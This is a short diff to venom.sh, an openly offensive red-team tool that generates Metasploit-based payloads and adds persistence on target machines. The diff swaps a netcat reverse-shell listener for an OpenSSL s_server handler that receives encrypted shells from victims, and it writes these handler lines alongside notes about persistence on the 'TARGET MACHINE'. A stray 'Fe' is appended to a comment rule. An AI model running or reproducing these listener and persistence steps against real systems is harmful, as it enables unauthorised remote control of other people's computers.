@@ -4,7 +4,7 @@
 # Author: pedr0 Ubuntu [r00t-3xp10it] version: 1.0.16evas
 # Suspicious-Shell-Activity (SSA) RedTeam develop @2017 - 2019
 # codename: aconitum_nappelus [ GPL licensed ]
-# --------------------------------------------------------------
+# --------------------------------------------------------------Fe
 # [DEPENDENCIES]
 # "venom.sh will download/install all dependencies as they are needed"
 # Zenity | Metasploit | GCC (unix) |  Pyinstaller (python-to-exe module)
@@ -12336,7 +12336,8 @@ rm $ApAcHe/Download.html > /dev/nul 2>&1
 if [ "$persistence" = "Add persistence)" ]; then
    ## Write how to delete persistence to output folder ..
    echo "LHOST: $lhost" > $IPATH/output/delete_persistence.txt
-   echo "HANDLER: sudo nc -lvp $lport" >> $IPATH/output/delete_persistence.txt
+   echo "HANDLER: cd venom/output" >> $IPATH/output/delete_persistence.txt
+   echo "HANDLER: sudo openssl s_server -quiet -key key.pem -cert cert.pem -port $lport" >> $IPATH/output/delete_persistence.txt
    echo "+-----------------------------------------+" >> $IPATH/output/delete_persistence.txt
    echo "|TO DELETE PERSISTENCE FROM TARGET MACHINE|" >> $IPATH/output/delete_persistence.txt
    echo "|EXECUTE THE FOLLOW COMMANDS ON TARGET CMD|" >> $IPATH/output/delete_persistence.txt
